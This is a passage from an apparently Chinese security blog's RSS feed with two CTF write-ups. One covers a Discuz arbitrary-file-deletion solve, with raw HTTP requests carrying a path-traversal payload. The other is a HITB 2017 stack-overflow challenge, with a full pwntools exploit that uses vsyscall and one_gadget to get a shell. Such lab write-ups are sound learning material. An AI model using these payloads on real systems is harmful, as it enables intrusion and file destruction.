<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>get flag?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- include 'safe.php';</span></div><div class="line"></div><div class="line"></div><div class="line">if($_REQUEST['passwd'] === 'jiajiajiajiajia')&#123;</div><div class="line">    echo "$flag";</div><div class="line">&#125; --&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">Oh,Hacked ?</div></pre></td></tr></table></figure>
<p>尝试访问：<code>http://172.17.0.3/index.php?passwd=jiajiajiajiajia</code>当然是失败的，因为有个<code>safe.php</code></p>
<p>然后根据前面dz获取到的信息，猜测safe.php是ip过滤，然后我得到一个思路(当然是错误的思路): 利用dz的ssrf访问<code>http://127.0.0.1/index.php?passwd=jiajiajiajiajia</code>, 因为dz的ssrf是一个远程图片下载的，所以会把请求到的信息下载下来保存到本地，然后<code>/data</code>目录是可遍历的，文件会下载到<code>data/attachment/profile/201710/0x</code>目录下。</p>
<p>但是目录遍历到201710就没法遍历了，发现是有一个index.html，然后有了一个思路，是利用任意文件删除漏洞把index.html删除，成功了，可以看到<code>data/attachment/profile/201710/04/</code>目录下的文件了，然后尝试ssrf，但是是失败的，源码审计看了一会，原来dz把ssrf请求下来的保存成文件后会获取图片信息，如果获取失败会删除。</p>
<p>想了想竞争，但是从保存文件到删除文件，间隔时间太短了，竞争不靠谱。。。又陷入僵局</p>
<p>然后出题人半夜改题了，一个开始80是nginx服务，dz是apache服务。然后换成了80是apache，dz是nginx。</p>
<p>然后我之前的思路就完成GG了，因为无法获取到下载下来的文件名。</p>
<p>然后就只剩一个思路了，利用dz的任意文件删除漏洞，删除safe.php</p>
<p>最开始我也想过这个，但是这个思路的问题太多了，一个是两个不同服务，凭啥有权限删除，safe.php又不是在upload这种会777的目录下，第二就是，一个人做出来了其他人不也做出来了</p>
<p>半夜2点多的时候尝试删除safe.php，失败，睡觉，早上9点多起来发现已经3血了，再次尝试，成功。。。。。。。。。。。。。。。。。。</p>
<p>没有写PoC，手工做题，首先python先跑起来：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; while True:</div><div class="line">...     r = requests.get(url3)</div><div class="line">...     print r.content</div><div class="line">...     if r.status_code == 404:</div><div class="line">...         print "right"</div><div class="line">...         r = requests.get(url2)</div><div class="line">...         print r.content</div><div class="line">...     time.sleep(1)</div><div class="line">Oh,Hacked ?</div></pre></td></tr></table></figure>
<p>然后使用burp，首先是请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1</div><div class="line">Host: 172.17.0.3:8090</div><div class="line">Content-Length: 2244</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://172.17.0.3:8090</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://172.17.0.3:8090/home.php?mod=spacecp&amp;ac=profile&amp;op=base</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4</div><div class="line">Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_sendmail=1; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_seccode=19.90700de229cc94ae7e; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_lip=172.17.0.2%2C1507030640; 3LFi_2132_nofavfid=1; 3LFi_2132_onlineusernum=1; 3LFi_2132_checkpm=1; 3LFi_2132_sid=QGWdpE; 3LFi_2132_lastact=1507037551%09misc.php%09patch</div><div class="line">Connection: close</div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;formhash&quot;</div><div class="line"></div><div class="line">89dbe522</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;realname&quot;</div><div class="line"></div><div class="line">aklis</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[realname]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;gender&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[gender]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthyear&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthmonth&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[birthday]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;birthprovince&quot;</div><div class="line"></div><div class="line">../../../../../../../../../usr/share/nginx/html/safe.php</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[birthcity]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;resideprovince&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[residecity]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;affectivestatus&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[affectivestatus]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;lookingfor&quot;</div><div class="line"></div><div class="line"></div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[lookingfor]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;bloodtype&quot;</div><div class="line"></div><div class="line">A</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;privacy[bloodtype]&quot;</div><div class="line"></div><div class="line">0</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmit&quot;</div><div class="line"></div><div class="line">true</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmitbtn&quot;</div><div class="line"></div><div class="line">true</div><div class="line">------WebKitFormBoundaryHL816KVx2cHVmZcq--</div></pre></td></tr></table></figure>
<p>然后再请求:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base&amp;deletefile[birthprovince]=aaa HTTP/1.1</div><div class="line">Host: 172.17.0.3:8090</div><div class="line">Connection: close</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept: */*</div><div class="line">User-Agent: python-requests/2.18.1</div><div class="line">Content-Length: 543</div><div class="line">Cookie: 3LFi_2132_saltkey=iAo9aN8L; 3LFi_2132_lastvisit=1507028276; 3LFi_2132_home_readfeed=1507037399; 3LFi_2132_ulastactivity=5e6dmN2yw6RW9gYAeu0%2BFQj4zPpXufkmFS79DZbibxsS1GKyf30i; 3LFi_2132_auth=e93etvAAYQo0lvRVwL9syLfiWnGnZj7HnZAZRfhXA84VUXaWbScrKrKqleMUclzMt%2FB67ybK%2FTtRoNhg%2FF7V; 3LFi_2132_lastcheckfeed=3%7C1507037417; 3LFi_2132_nofavfid=1; 3LFi_2132_visitedfid=2; 3LFi_2132_forum_lastvisit=D_2_1507041771; 3LFi_2132_st_p=3%7C1507041805%7C587c0547c79d9aad1865192204c3e348; 3LFi_2132_viewid=tid_1; 3LFi_2132_lip=172.17.0.2%2C1507041386; 3LFi_2132_st_t=3%7C1507042459%7Cec88a27fedbb1c6205e196d933f91e42; 3LFi_2132_editormode_e=1; 3LFi_2132_seccode=47.a0f88955fd6a0cfce9; 3LFi_2132_smile=1D1; 3LFi_2132_onlineusernum=9; 3LFi_2132_checkpm=1; 3LFi_2132_sendmail=1; 3LFi_2132_home_diymode=1; 3LFi_2132_sid=A92w24; 3LFi_2132_lastact=1507046589%09home.php%09misc</div><div class="line">Content-Type: multipart/form-data; boundary=2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line"></div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;profilesubmit&quot;</div><div class="line"></div><div class="line">1</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;formhash&quot;</div><div class="line"></div><div class="line">89dbe522</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b</div><div class="line">Content-Disposition: form-data; name=&quot;birthprovince&quot;; filename=&quot;a.png&quot;</div><div class="line">Content-Type: image/png</div><div class="line"></div><div class="line">PS: 正常的图片，因为有不可显字符，就不复制上来了，懒得截图....</div><div class="line">--2b4ed56c9a8d4dff838f4fba3c258b9b--</div></pre></td></tr></table></figure>
<p>然后成功getflag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">File not found.</div><div class="line"></div><div class="line">right</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</div><div class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</div><div class="line">    &lt;title&gt;get flag?&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;!-- include &apos;safe.php&apos;;</div><div class="line"></div><div class="line"></div><div class="line">if($_REQUEST[&apos;passwd&apos;] === &apos;jiajiajiajiajia&apos;)&#123;</div><div class="line">    echo &quot;$flag&quot;;</div><div class="line">&#125; --&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"></div><div class="line">pwnhub&#123;flag:800eaf3244994b224c30e5f24b59f178&#125;</div></pre></td></tr></table></figure>
<p>PS: 这题我给的评分是4，我觉得最后一步是本题的败笔，首先环境的问题就不说了。主要是这个思路，只是为出题而设置的，没啥其他意义。。。。前面的思路都挺好的。</p>
<p>本文就附一张图：</p>
<p><img src="http://qn.lazysheep.cc/img/cai.jpg" alt="wohaocaia.jpg"></p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/10/04/0x3A/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HITB CTF 2017 Pwn题研究🙉</title>
      <link>http://0x48.pw/2017/08/29/0x39/</link>
      <guid>http://0x48.pw/2017/08/29/0x39/</guid>
      <pubDate>Tue, 29 Aug 2017 11:11:04 GMT</pubDate>
      <description>
      
        &lt;p&gt;上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..</p>
<a id="more"></a>
<p>题目在我GitHub上有：🔞<a href="https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)</a></p>
<h1 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h1><p>这题是一道栈溢出的题目，溢出点也很容易找到，但问题是开了EIP，当时的思路是想可能有啥骚操作可以让hint函数泄露出system地址……可惜一直想错了，最主要有一个知识点我不知道</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /proc/self/maps</span></div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure>
<p>以前从来没注意到过，linux下的每个程序都有一个这样的虚拟地址，而且不管开没开EIP，这段地址都是不变的。</p>
<p>再开看看这段地址是啥指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/5i 0xffffffffff600000</div><div class="line">   0xffffffffff600000:	mov    rax,0x60</div><div class="line">   0xffffffffff600007:	syscall </div><div class="line">   0xffffffffff600009:	ret</div></pre></td></tr></table></figure>
<p>就是一个不知道啥的系统调用然后ret，然后查了一些资料，这段地址是内核映射出来让程序调用内核一些功能的。而这段有用的指令就是一个ret，那么通过这个ret我们能进行怎样的骚操作？</p>
<p>首先要先能理清楚栈结构，当我们的的流程是这样的时候：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main -&gt; hint -&gt; main -&gt; go -&gt; level</div></pre></td></tr></table></figure>
<p>首先我们调用hint函数时，栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb1.png" alt="hitb1"></p>
<p>然后在hint函数中并没有输出system的地址，但是却把system的地址放入了栈中</p>
<p>执行完hint函数后，返回main函数，然后再调用go函数，这个时候栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb2.png" alt="hitb2"></p>
<p>在hint函数中存放system地址的栈是在上图中变量v6的位置，在go函数中还调用了level函数，而溢出正好就是在level函数中，所以如果我们溢出构造一个栈地址如下所示</p>
<table>
<thead>
<tr>
<th style="text-align:center">0xffffffffff600000</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">v6(&amp;system)</td>
</tr>
</tbody>
</table>
<p>这样就能执行system函数了</p>
<p>然后我们再来解决其他问题，v6是啥？会不会覆盖system，能执行system但是不能控制参数等问题。</p>
<p>见如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">v2 = read_num();</div><div class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</div><div class="line">	v5 = v2;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</div><div class="line">v3 = read_num();</div><div class="line">v6 = v5 + v3;</div></pre></td></tr></table></figure>
<p>上面的代码是ida反编译go函数的代码，这部分要结合汇编看</p>
<p>v5和v6的地址是一样的，所以如果输入的v2值大于0，则会把system的地址覆盖掉，这很好解决，输入负数和0都行，然后通过v3的输入，我们能在system地址的基础上进行加减。</p>
<p>因为有libc，所以我们可以先获取system的符号地址为<code>0x45390</code></p>
<p>然后使用<code>one_gadget</code>工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x4526a	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xcd0f3	execve("/bin/sh", rcx, r12)</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xcd1c8	execve("/bin/sh", rax, r12)</div><div class="line">constraints:</div><div class="line">  [rax] == NULL || rax == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xf0274	execve("/bin/sh", rsp+0x50, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x50] == NULL</div><div class="line"></div><div class="line">0xf1117	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</div></pre></td></tr></table></figure>
<p>能获取到执行<code>execve(&#39;/bin/sh&#39;)</code>指令的地址，随便选一个和system地址相减得到差值，这个值就是v3，这样就把system的地址设置成执行<code>execve</code>的地址了，这样当rip跳到这里时就能直接执行系统命令了。</p>
<p>但是还有一个小细节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">999</span> )</div><div class="line">    &#123;</div><div class="line">      v7 = v6;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"More levels than before!"</span>);</div><div class="line">      v7 = <span class="number">1000L</span>L;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</div><div class="line">    v4 = time(<span class="number">0L</span>L);</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      v1 = time(<span class="number">0L</span>L);</div><div class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - v4), v3);</div><div class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>因为<code>execve</code>的地址大于999，所以v7被设置为1000，所以level需要进行1000次递归</p>
<p>第一种思路是写代码，自动答对所有题目，然后在最后一次递归的时候溢出</p>
<p>还有因为溢出的长度有0x200，所以其实不必跑1000次</p>
<p>如果没有答对题目，递归则会退出，就没法进行溢出了</p>
<p>最后得到payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">	context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</div><div class="line">	context.log_level = <span class="string">"debug"</span></div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'47.74.147.103'</span>, <span class="number">20001</span>)</div><div class="line"></div><div class="line">libc_base = <span class="number">-0x45390</span></div><div class="line">one_gadget_base = <span class="number">0x4526a</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Question: '</span>) </div><div class="line">	tmp1 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.recvuntil(<span class="string">'* '</span>)</div><div class="line">	tmp2 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.sendline(str(tmp1 * tmp2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer2</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Answer:"</span>)</div><div class="line">	p.sendline(<span class="string">"233"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">'How many levels?'</span>)</div><div class="line">p.sendline(<span class="string">'-1'</span>)</div><div class="line">p.recvuntil(<span class="string">'Any more?'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p.sendline("2")</span></div><div class="line">p.sendline(str(libc_base+one_gadget_base))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>): </div><div class="line">	log.info(i)</div><div class="line">	ansewer()</div><div class="line">p.recvuntil(<span class="string">'Question: '</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line"></div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">3</span>) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>PS: 这题我没做出来，是看别人的Payload学习的，所以上面的Payload不是我自己写的.</p>
<p>PSS: 因为有别的重要的事，所以另外一题堆的题目暂时没空更新，等有空了会更新上来的</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/29/0x39/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
